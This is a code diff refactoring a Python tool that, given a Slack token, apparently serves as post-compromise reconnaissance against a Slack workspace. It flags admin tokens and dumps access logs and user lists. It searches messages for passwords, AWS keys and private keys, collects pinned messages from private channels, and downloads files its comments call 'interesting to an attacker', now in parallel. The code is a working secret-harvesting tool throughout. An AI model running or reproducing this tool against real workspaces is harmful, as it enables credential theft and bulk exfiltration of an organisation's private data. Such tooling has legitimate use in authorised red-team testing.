@@ -8,11 +8,16 @@ import time
 import colorama
 import requests
 import termcolor
+import queue
+
+from multiprocessing import Process, Queue
 from constants import getUserAgent
+
 
 #############
 # Constants #
 #############
+POLL_TIMEOUT = 500  # Milliseconds to wait on a retrieval to finish
 # Query params
 MAX_RETRIEVAL_COUNT = 900
 # Output file names
@@ -126,7 +131,7 @@ class ScanningContext:
 
 
 # Module functionality
-def is_rate_limited(slack_api_json_response):
+def sleep_if_rate_limited(slack_api_json_response):
     """
     All this function does is check if the response tells us we're being rate-limited. If it is, sleep for
     60 seconds then continue. Previously I was proactively sleeping for 60 seconds before the documented rate-limit
@@ -197,14 +202,14 @@ def check_token_validity(token, user_agent: str) -> ScanningContext:
     return result
 
 
-def check_if_admin_token(token, output_info: ScanningContext):
+def check_if_admin_token(token, scan_context: ScanningContext):
     """
     Checks to see if the token provided is an admin, owner, or primary_owner. If it is, print a message to stdout
     """
 
     try:
         r = requests.get("https://slack.com/api/users.info", params=dict(
-            token=token, pretty=1, user=output_info.user_id, headers={'User-Agent': output_info.user_agent})).json()
+            token=token, pretty=1, user=scan_context.user_id, headers={'User-Agent': scan_context.user_agent})).json()
         if r['user']['is_admin'] or r['user']['is_owner'] or r['user']['is_primary_owner']:
             print(termcolor.colored("BINGO: You seem to be in possession of an admin token!", "white", "on_magenta"))
             print(termcolor.colored("\n"))
@@ -214,14 +219,14 @@ def check_if_admin_token(token, output_info: ScanningContext):
         print(termcolor.colored(exception, "white", "on_red"))
 
 
-def print_interesting_information(output_info: ScanningContext):
+def print_interesting_information(scan_context: ScanningContext):
     """
     I wonder how many people know that Slack advertise the @domains that can be used to register for the Workspace?
     I've seen organizations leave old/expired/stale domains in here which can then be used by attackers to gain access
     """
 
     try:
-        r = requests.get(output_info.slack_workspace, headers={'User-Agent': output_info.user_agent})
+        r = requests.get(scan_context.slack_workspace, headers={'User-Agent': scan_context.user_agent})
         team_domains_match = re.findall(WORKSPACE_VALID_EMAILS_REGEX, str(r.content))
         for domain in team_domains_match:
             print(
@@ -232,7 +237,7 @@ def print_interesting_information(output_info: ScanningContext):
         print(termcolor.colored(exception, "white", "on_red"))
 
 
-def dump_team_access_logs(token, output_info: ScanningContext):
+def dump_team_access_logs(token, scan_context: ScanningContext):
     """
     You need the token of an elevated user (lucky you!) and the Workspace must be a paid one - i.e., not a free one
     The information here can be useful but I wouldn't fret about it - the other data is far more interesting
@@ -243,12 +248,12 @@ def dump_team_access_logs(token, output_info: ScanningContext):
     try:
         r = requests.get("https://slack.com/api/team.accessLogs",
                          params=dict(token=token, pretty=1, count=MAX_RETRIEVAL_COUNT),
-                         headers={'User-Agent': output_info.user_agent}).json()
-        is_rate_limited(r)
+                         headers={'User-Agent': scan_context.user_agent}).json()
+        sleep_if_rate_limited(r)
         if str(r['ok']) == 'True':
             for value in r['logins']:
                 results.append(value)
-            with open(output_info.output_directory + '/' + FILE_ACCESS_LOGS, 'a', encoding="utf-8") as outfile:
+            with open(scan_context.output_directory + '/' + FILE_ACCESS_LOGS, 'a', encoding="utf-8") as outfile:
                 json.dump(results, outfile, indent=4, sort_keys=True, ensure_ascii=False)
         else:
             print(termcolor.colored(
@@ -259,12 +264,12 @@ def dump_team_access_logs(token, output_info: ScanningContext):
     except requests.exceptions.RequestException as exception:
         print(termcolor.colored(exception, "white", "on_red"))
     print(termcolor.colored(
-        "END: Successfully dumped access logs! Filename: ./" + output_info.output_directory + "/" + FILE_ACCESS_LOGS,
+        "END: Successfully dumped access logs! Filename: ./" + scan_context.output_directory + "/" + FILE_ACCESS_LOGS,
         "white", "on_green"))
     print(termcolor.colored("\n"))
 
 
-def dump_user_list(token, output_info: ScanningContext):
+def dump_user_list(token, scan_context: ScanningContext):
     """
     In case you're wondering (hello fellow nerd/future me), the reason for limit=900 is because what Slack says:
     `To begin pagination, specify a limit value under 1000. We recommend no more than 200 results at a time.`
@@ -281,8 +286,8 @@ def dump_user_list(token, output_info: ScanningContext):
         while True:
             r = requests.get("https://slack.com/api/users.list",
                          params=dict(token=token, pretty=1, limit=1, cursor=pagination_cursor),
-                         headers={'User-Agent': output_info.user_agent}).json()
-            if not is_rate_limited(r):
+                         headers={'User-Agent': scan_context.user_agent}).json()
+            if not sleep_if_rate_limited(r):
                 break
         if str(r['ok']) == 'False':
             print(termcolor.colored("END: Unable to dump the user list. Slack error: " + str(r['error']),
@@ -293,24 +298,24 @@ def dump_user_list(token, output_info: ScanningContext):
             while str(r['ok']) == 'True' and pagination_cursor:
                 request_url = "https://slack.com/api/users.list"
                 params = dict(token=token, pretty=1, limit=MAX_RETRIEVAL_COUNT, cursor=pagination_cursor)
-                r = requests.get(request_url, params=params, headers={'User-Agent': output_info.user_agent}).json()
+                r = requests.get(request_url, params=params, headers={'User-Agent': scan_context.user_agent}).json()
                 for value in r['members']:
                     pagination_cursor = r['response_metadata']['next_cursor']
                     results.append(value)
-            with open(output_info.output_directory + '/' + FILE_USER_LIST, 'a', encoding="utf-8") as outfile:
+            with open(scan_context.output_directory + '/' + FILE_USER_LIST, 'a', encoding="utf-8") as outfile:
                 json.dump(results, outfile, indent=4, sort_keys=True, ensure_ascii=True)
     except requests.exceptions.RequestException as exception:
         print(termcolor.colored(exception, "white", "on_red"))
     print(
-        termcolor.colored("END: Successfully dumped user list! Filename: ./" + output_info.output_directory +
+        termcolor.colored("END: Successfully dumped user list! Filename: ./" + scan_context.output_directory +
                           "/" + FILE_USER_LIST,
                           "white", "on_green"))
     print(termcolor.colored("\n"))
 
 
-def find_s3(token, output_info: ScanningContext):
+def find_s3(token, scan_context: ScanningContext):
     print(termcolor.colored("START: Attempting to find references to S3 buckets", "white", "on_blue"))
-    pagination = {}
+    page_count_by_query = dict()
 
     try:
         r = None
@@ -318,35 +323,35 @@ def find_s3(token, output_info: ScanningContext):
             while True:
                 r = requests.get("https://slack.com/api/search.messages",
                                  params=dict(token=token, query="\"{}\"".format(query), pretty=1, count=100),
-                                 headers={'User-Agent': output_info.user_agent}).json()
-                if not is_rate_limited(r):
+                                 headers={'User-Agent': scan_context.user_agent}).json()
+                if not sleep_if_rate_limited(r):
                     break
-            pagination[query] = (r['messages']['pagination']['page_count'])
+            page_count_by_query[query] = (r['messages']['pagination']['page_count'])
 
-        for key, value in pagination.items():
+        for query, page_count in page_count_by_query.items():
             page = 1
-            while page <= value:
-                is_rate_limited(r)
-                params = dict(token=token, query="\"{}\"".format(key), pretty=1, count=100, page=str(page))
+            while page <= page_count:
+                sleep_if_rate_limited(r)
+                params = dict(token=token, query="\"{}\"".format(query), pretty=1, count=100, page=str(page))
                 r = requests.get("https://slack.com/api/search.messages",
                                  params=params,
-                                 headers={'User-Agent': output_info.user_agent}).json()
+                                 headers={'User-Agent': scan_context.user_agent}).json()
                 regex_results = re.findall(S3_REGEX, str(r))
-                with open(output_info.output_directory + '/' + FILE_S3, 'a', encoding="utf-8") as log_output:
+                with open(scan_context.output_directory + '/' + FILE_S3, 'a', encoding="utf-8") as log_output:
                     for item in set(regex_results):
                         log_output.write(item + "\n")
                 page += 1
     except requests.exceptions.RequestException as exception:
         print(termcolor.colored(exception, "white", "on_red"))
         print(termcolor.colored("\n"))
-    file_cleanup(input_file=FILE_S3, output_info=output_info)
+    file_cleanup(input_file=FILE_S3, scan_context=scan_context)
     print(
-        termcolor.colored("END: If any S3 buckets were found, they will be here: ./" + output_info.output_directory +
+        termcolor.colored("END: If any S3 buckets were found, they will be here: ./" + scan_context.output_directory +
                           "/" + FILE_S3, "white", "on_green"))
     print(termcolor.colored("\n"))
 
 
-def find_credentials(token, output_info: ScanningContext):
+def find_credentials(token, scan_context: ScanningContext):
     print(termcolor.colored("START: Attempting to find references to credentials", "white", "on_blue"))
     pagination = dict()
 
@@ -357,34 +362,34 @@ def find_credentials(token, output_info: ScanningContext):
                 params = dict(token=token, query="\"{}\"".format(query), pretty=1, count=100)
                 r = requests.get("https://slack.com/api/search.messages",
                                  params=params,
-                                 headers={'User-Agent': output_info.user_agent}).json()
-                if not is_rate_limited(r):
+                                 headers={'User-Agent': scan_context.user_agent}).json()
+                if not sleep_if_rate_limited(r):
                     break
             pagination[query] = (r['messages']['pagination']['page_count'])
 
         for key, value in pagination.items():
             page = 1
             while page <= value:
-                is_rate_limited(r)
+                sleep_if_rate_limited(r)
                 request_url = "https://slack.com/api/search.messages"
                 params = dict(token=token, query="\"{}\"".format(key), pretty=1, count=100, page=str(page))
-                r = requests.get(request_url, params=params, headers={'User-Agent': output_info.user_agent}).json()
+                r = requests.get(request_url, params=params, headers={'User-Agent': scan_context.user_agent}).json()
                 regex_results = re.findall(CREDENTIALS_REGEX, str(r))
-                with open(output_info.output_directory + '/' + FILE_CREDENTIALS, 'a', encoding="utf-8") as log_output:
+                with open(scan_context.output_directory + '/' + FILE_CREDENTIALS, 'a', encoding="utf-8") as log_output:
                     for item in set(regex_results):
                         log_output.write(item + "\n")
                 page += 1
     except requests.exceptions.RequestException as exception:
         print(termcolor.colored(exception, "white", "on_red"))
-    file_cleanup(input_file=FILE_CREDENTIALS, output_info=output_info)
+    file_cleanup(input_file=FILE_CREDENTIALS, scan_context=scan_context)
     print(termcolor.colored(
-        "END: If any credentials were found, they will be here: ./" + output_info.output_directory +
+        "END: If any credentials were found, they will be here: ./" + scan_context.output_directory +
         "/" + FILE_CREDENTIALS,
         "white", "on_green"))
     print(termcolor.colored("\n"))
 
 
-def find_aws_keys(token, output_info: ScanningContext):
+def find_aws_keys(token, scan_context: ScanningContext):
     print(termcolor.colored("START: Attempting to find references to AWS keys", "white", "on_blue"))
     pagination = {}
 
@@ -395,33 +400,33 @@ def find_aws_keys(token, output_info: ScanningContext):
                 params = dict(token=token, query=query, pretty=1, count=100)
                 r = requests.get("https://slack.com/api/search.messages",
                              params=params,
-                             headers={'User-Agent': output_info.user_agent}).json()
-                if not is_rate_limited(r):
+                             headers={'User-Agent': scan_context.user_agent}).json()
+                if not sleep_if_rate_limited(r):
                     break
             pagination[query] = (r['messages']['pagination']['page_count'])
 
         for key, value in pagination.items():
             page = 1
             while page <= value:
-                is_rate_limited(r)
+                sleep_if_rate_limited(r)
                 request_url = "https://slack.com/api/search.messages"
                 params = dict(token=token, query=key, pretty=1, count=100, page=str(page))
-                r = requests.get(request_url, params=params, headers={'User-Agent': output_info.user_agent}).json()
+                r = requests.get(request_url, params=params, headers={'User-Agent': scan_context.user_agent}).json()
                 regex_results = re.findall(AWS_KEYS_REGEX, str(r))
-                with open(output_info.output_directory + '/' + FILE_AWS_KEYS, 'a', encoding="utf-8") as log_output:
+                with open(scan_context.output_directory + '/' + FILE_AWS_KEYS, 'a', encoding="utf-8") as log_output:
                     for item in set(regex_results):
                         log_output.write(item + "\n")
                 page += 1
     except requests.exceptions.RequestException as exception:
         print(termcolor.colored(exception, "white", "on_red"))
-    file_cleanup(input_file=FILE_AWS_KEYS, output_info=output_info)
+    file_cleanup(input_file=FILE_AWS_KEYS, scan_context=scan_context)
     print(termcolor.colored(
-        "END: If any AWS keys were found, they will be here: ./" + output_info.output_directory +
+        "END: If any AWS keys were found, they will be here: ./" + scan_context.output_directory +
         "/" + FILE_AWS_KEYS, "white", "on_green"))
     print(termcolor.colored("\n"))
 
 
-def find_private_keys(token, output_info: ScanningContext):
+def find_private_keys(token, scan_context: ScanningContext):
     """
     Searching for private keys by using certain keywords. Slack returns the actual string '\n' in the response so
     we're replacing the string with an actual \n new line :-)
@@ -437,21 +442,21 @@ def find_private_keys(token, output_info: ScanningContext):
                 params = dict(token=token, query="\"{}\"".format(query), pretty=1, count=100)
                 r = requests.get("https://slack.com/api/search.messages",
                              params=params,
-                             headers={'User-Agent': output_info.user_agent}).json()
-                if not is_rate_limited(r):
+                             headers={'User-Agent': scan_context.user_agent}).json()
+                if not sleep_if_rate_limited(r):
                     break
             pagination[query] = (r['messages']['pagination']['page_count'])
 
         for key, value in pagination.items():
             page = 1
             while page <= value:
-                is_rate_limited(r)
+                sleep_if_rate_limited(r)
                 request_url = "https://slack.com/api/search.messages"
                 params = dict(token=token, query="\"{}\"".format(key), pretty=1, count=100, page=str(page))
-                r = requests.get(request_url, params=params, headers={'User-Agent': output_info.user_agent}).json()
+                r = requests.get(request_url, params=params, headers={'User-Agent': scan_context.user_agent}).json()
                 regex_results = re.findall(PRIVATE_KEYS_REGEX, str(r))
                 remove_new_line_char = [w.replace('\\n', '\n') for w in regex_results]
-                with open(output_info.output_directory + '/' + FILE_PRIVATE_KEYS, 'a', encoding="utf-8") as log_output:
+                with open(scan_context.output_directory + '/' + FILE_PRIVATE_KEYS, 'a', encoding="utf-8") as log_output:
                     for item in set(remove_new_line_char):
                         log_output.write(item + "\n\n")
                 page += 1
@@ -459,12 +464,12 @@ def find_private_keys(token, output_info: ScanningContext):
         print(termcolor.colored(exception, "white", "on_red"))
 
     print(termcolor.colored(
-        "END: If any private keys were found, they will be here: ./" + output_info.output_directory +
+        "END: If any private keys were found, they will be here: ./" + scan_context.output_directory +
         "/" + FILE_PRIVATE_KEYS, "white", "on_green"))
     print(termcolor.colored("\n"))
 
 
-def find_all_channels(token, output_info: ScanningContext):
+def find_all_channels(token, scan_context: ScanningContext):
     """
     Return a dictionary of the names and ids of all Slack channels that the token has access to.
     This includes public and private channels.
@@ -478,8 +483,8 @@ def find_all_channels(token, output_info: ScanningContext):
                              params=dict(token=token,
                                          pretty=1, limit=1, cursor=pagination_cursor,
                                          types='public_channel,private_channel'),
-                             headers={'User-Agent': output_info.user_agent}).json()
-            if not is_rate_limited(r):
+                             headers={'User-Agent': scan_context.user_agent}).json()
+            if not sleep_if_rate_limited(r):
                 pagination_cursor = r['response_metadata']['next_cursor']
                 break
         while str(r['ok']) and pagination_cursor:
@@ -487,7 +492,7 @@ def find_all_channels(token, output_info: ScanningContext):
                              params=dict(token=token,
                                          pretty=1, limit=MAX_RETRIEVAL_COUNT, cursor=pagination_cursor,
                                          types='public_channel,private_channel'),
-                             headers={'User-Agent': output_info.user_agent}).json()
+                             headers={'User-Agent': scan_context.user_agent}).json()
             pagination_cursor = r['response_metadata']['next_cursor']
             for channel in r['channels']:
                 # Add the channel name as the key and id as the value in the dictionary.
@@ -497,7 +502,7 @@ def find_all_channels(token, output_info: ScanningContext):
     return channel_list
 
 
-def find_pinned_messages(token, output_info: ScanningContext):
+def find_pinned_messages(token, scan_context: ScanningContext):
     """
     This function looks for pinned messages across all Slack channels the token has access to - including private
     channels. We often find interesting information in pinned messages.
@@ -506,18 +511,18 @@ def find_pinned_messages(token, output_info: ScanningContext):
     """
 
     print(termcolor.colored("START: Attempting to find references to pinned messages", "white", "on_blue"))
-    channel_list = find_all_channels(token, output_info)
+    channel_list = find_all_channels(token, scan_context)
     try:
         for channel_name, channel_id in channel_list.items():
             while True:
                 r = requests.get("https://slack.com/api/pins.list",
                                  params=dict(token=token, pretty=1, channel=channel_id),
-                                 headers={'User-Agent': output_info.user_agent}).json()
-                if not is_rate_limited(r):
+                                 headers={'User-Agent': scan_context.user_agent}).json()
+                if not sleep_if_rate_limited(r):
                     if r['items']:
                         for pinned_message in r['items']:
                             if pinned_message['type'] == 'message':
-                                with open(output_info.output_directory + '/' + FILE_PINNED_MESSAGES, 'a',
+                                with open(scan_context.output_directory + '/' + FILE_PINNED_MESSAGES, 'a',
                                           encoding="utf-8") as log_output:
                                     log_output.write(channel_name + "," + pinned_message['message']['text'] + "\n")
                     break
@@ -525,12 +530,12 @@ def find_pinned_messages(token, output_info: ScanningContext):
         print(termcolor.colored(exception, "white", "on_red"))
 
     print(termcolor.colored(
-        "END: If any pinned messages were found, they will be here: ./" + output_info.output_directory +
+        "END: If any pinned messages were found, they will be here: ./" + scan_context.output_directory +
         "/" + FILE_PINNED_MESSAGES, "white", "on_green"))
     print(termcolor.colored("\n"))
 
 
-def find_interesting_links(token, output_info: ScanningContext):
+def find_interesting_links(token, scan_context: ScanningContext):
     """
     Does a search for URI/URLs by searching for keywords such as 'amazonaws', 'jenkins', etc.
     We're using the special Slack search 'has:link' here.
@@ -545,84 +550,117 @@ def find_interesting_links(token, output_info: ScanningContext):
             while True:
                 request_url = "https://slack.com/api/search.messages"
                 params = dict(token=token, query="has:link {}".format(query), pretty=1, count=100)
-                r = requests.get(request_url, params=params, headers={'User-Agent': output_info.user_agent}).json()
-                if not is_rate_limited(r):
+                r = requests.get(request_url, params=params, headers={'User-Agent': scan_context.user_agent}).json()
+                if not sleep_if_rate_limited(r):
                     break
             pagination[query] = (r['messages']['pagination']['page_count'])
 
         for key, value in pagination.items():
             page = 1
             while page <= value:
-                is_rate_limited(r)
+                sleep_if_rate_limited(r)
                 request_url = "https://slack.com/api/search.messages"
                 params = dict(token=token, query="has:link {}".format(key), pretty=1, count=100, page=str(page))
-                r = requests.get(request_url, params=params, headers={'User-Agent': output_info.user_agent}).json()
+                r = requests.get(request_url, params=params, headers={'User-Agent': scan_context.user_agent}).json()
                 regex_results = re.findall(LINKS_REGEX, str(r))
-                with open(output_info.output_directory + '/' + FILE_LINKS, 'a', encoding="utf-8") as log_output:
+                with open(scan_context.output_directory + '/' + FILE_LINKS, 'a', encoding="utf-8") as log_output:
                     for item in set(regex_results):
                         log_output.write(item + "\n")
                 page += 1
     except requests.exceptions.RequestException as exception:
         print(termcolor.colored(exception, "white", "on_red"))
-    file_cleanup(input_file=FILE_LINKS, output_info=output_info)
-    print(termcolor.colored("END: If any URLs were found, they will be here: ./" + output_info.output_directory +
+    file_cleanup(input_file=FILE_LINKS, scan_context=scan_context)
+    print(termcolor.colored("END: If any URLs were found, they will be here: ./" + scan_context.output_directory +
                             "/" + FILE_LINKS, "white", "on_green"))
     print(termcolor.colored("\n"))
 
 
-def download_interesting_files(token, output_info: ScanningContext):
+def download_interesting_files(token, scan_context: ScanningContext):
     """
     Downloads files which may be interesting to an attacker. Searches for certain keywords then downloads.
-    bad_characters is used to strip out characters which though accepted in Slack, aren't accepted in Windows
+    bad_characters
     """
 
     print(termcolor.colored("START: Attempting to download interesting files (this may take some time)", "white",
                             "on_blue"))
-    pathlib.Path(output_info.output_directory + '/downloads').mkdir(parents=True, exist_ok=True)
-    bad_characters = "/\\:*?\"<>|"  # Windows doesn't like these characters. Guess how I found out.
-    strip_bad_characters = str.maketrans(bad_characters, '_________')  # Replace bad characters with an underscore
-    pagination = {}
+    pathlib.Path(scan_context.output_directory + '/downloads').mkdir(parents=True, exist_ok=True)
+    # strips out characters which, though accepted in Slack, aren't accepted in Windows
+    bad_chars_re = re.compile('[/:*?"<>|\\\]') # Windows doesn't like "/ \ : * ? < > " or |
+    page_counts_by_query = dict()
+
+    download_directory = scan_context.output_directory + '/downloads'
+
+    completed_file_names = Queue()
+    file_requests = []
+
+    def _download_file(url: str, output_filename: str, q: Queue):
+        """Private helper to retrieve files in parallel"""
+        try:
+            response = requests.get(url, headers={'Authorization': 'Bearer ' + token,
+                                                           'User-Agent': scan_context.user_agent})
+
+            open("{}/{}".format(download_directory, output_filename), 'wb').write(response.content)
+            q.put("Completed downloading [{}] from [{}].".format(output_filename, url))
+        except requests.exceptions.RequestException as ex:
+            msg = "Problem downloading [{}] from [{}]: {}".format(
+                output_filename, url, ex
+            )
+            print(termcolor.colored(msg, 'white', 'on_red'))
 
     try:
         for query in INTERESTING_FILE_QUERIES:
             while True:
                 request_url = "https://slack.com/api/search.files"
                 params = dict(token=token, query="\"{}\"".format(query), pretty=1, count=100)
-                r = requests.get(request_url, params=params, headers={'User-Agent': output_info.user_agent}).json()
-                if not is_rate_limited(r):
+                r = requests.get(request_url, params=params, headers={'User-Agent': scan_context.user_agent}).json()
+                if not sleep_if_rate_limited(r):
                     break
-            pagination[query] = (r['files']['pagination']['page_count'])
+            page_counts_by_query[query] = (r['files']['pagination']['page_count'])
 
-        for key, value in pagination.items():
+        for query, page_count in page_counts_by_query.items():
             page = 1
-            while page <= value:
+            while page <= page_count:
                 request_url = "https://slack.com/api/search.files"
-                params = dict(token=token, query="\"{}\"".format(key), pretty=1, count=100, page=str(page))
-                r = requests.get(request_url, params=params, headers={'User-Agent': output_info.user_agent}).json()
-                is_rate_limited(r)
+                params = dict(token=token, query="\"{}\"".format(query), pretty=1, count=100, page=str(page))
+                r = requests.get(request_url, params=params, headers={'User-Agent': scan_context.user_agent}).json()
+                sleep_if_rate_limited(r)
                 for file in r['files']['matches']:
                     file_name = file['name']
-                    r = requests.get(file['url_private'], headers={'Authorization': 'Bearer ' + token,
-                                                                   'User-Agent': output_info.user_agent})
-                    open(output_info.output_directory + '/downloads/' + ' ' + file_name.translate(
-                        strip_bad_characters), 'wb').write(r.content)
+                    safe_filename = bad_chars_re.sub('_', file_name)  # use underscores to replace tricky characters
+                    file_dl_args = (file['url_private'], safe_filename, completed_file_names)
+                    file_requests.append(Process(target=_download_file, args=file_dl_args))
                 page += 1
+        # Now actually fire the requests
+        for request in file_requests:
+            request.start()
+        # Wait for all requests to complete
+        # For each request, if it is still alive quickly check for completion.
+        for request in file_requests:
+            while request.is_alive():
+                request.join(timeout=1)
+                while True:
+                    try:
+                        response_message = completed_file_names.get(block=False)
+                        print(termcolor.colored(response_message, "white", "on_green"))
+                        break
+                    except queue.Empty:
+                        break
+
     except requests.exceptions.RequestException as exception:
         print(termcolor.colored(exception, "white", "on_red"))
-    print(
-        termcolor.colored(
-            "END: Downloaded files (if any were found) will be found in: ./" +
-            output_info.output_directory + "/downloads", "white", "on_green"))
+
+    print(termcolor.colored("END: Downloaded files (if any were found) will be found in: "
+                            "./{}/downloads".format(scan_context.output_directory), "white", "on_green"))
     print(termcolor.colored("\n"))
 
 
-def file_cleanup(input_file, output_info: ScanningContext):
+def file_cleanup(input_file, scan_context: ScanningContext):
     """
     these few lines of sweetness do two things: (1) de-duplicate the content by using Python Sets and
     (2) remove lines containing "com/archives/" <-- this is found in a lot of the  responses and isn't very useful
     """
 
-    reference_file = pathlib.Path(output_info.output_directory + '/' + input_file)
+    reference_file = pathlib.Path(scan_context.output_directory + '/' + input_file)
     if reference_file.is_file():
         with open(str(reference_file), 'r', encoding="utf-8") as file:
             lines = set(file.readlines())
@@ -706,9 +744,9 @@ if __name__ == '__main__':
         exit()
     # Baseline behavior
     provided_token = args.token
-    collected_output_info = check_token_validity(token=provided_token, user_agent=selected_agent)
-    check_if_admin_token(token=provided_token, output_info=collected_output_info)
-    print_interesting_information(output_info=collected_output_info)
+    collected_scan_context = check_token_validity(token=provided_token, user_agent=selected_agent)
+    check_if_admin_token(token=provided_token, scan_context=collected_scan_context)
+    print_interesting_information(scan_context=collected_scan_context)
 
     # Possible scans to run along with their flags
     flags_and_scans = [
@@ -735,7 +773,7 @@ if __name__ == '__main__':
 
     if no_flags_specified:
         for flag, scan in flags_and_scans:
-            scan(token=provided_token, output_info=collected_output_info)
+            scan(token=provided_token, scan_context=collected_scan_context)
         exit()
     elif any_true and any_false:  # There were both True and False arguments
         print(
@@ -744,8 +782,8 @@ if __name__ == '__main__':
     elif any_true:  # There were only enable flags specified
         for flag, scan in flags_and_scans:
             if args_as_dict.get(flag, None):  # if flag is True, then run the scan
-                scan(token=provided_token, output_info=collected_output_info)
+                scan(token=provided_token, scan_context=collected_scan_context)
     else:  # anyFalse - There were only disable flags specified
         for flag, scan in flags_and_scans:
             if not args_as_dict.get(flag, None) == False:  # if flag is not False (None), then run the scan
-                scan(token=provided_token, output_info=collected_output_info)
+                scan(token=provided_token, scan_context=collected_scan_context)
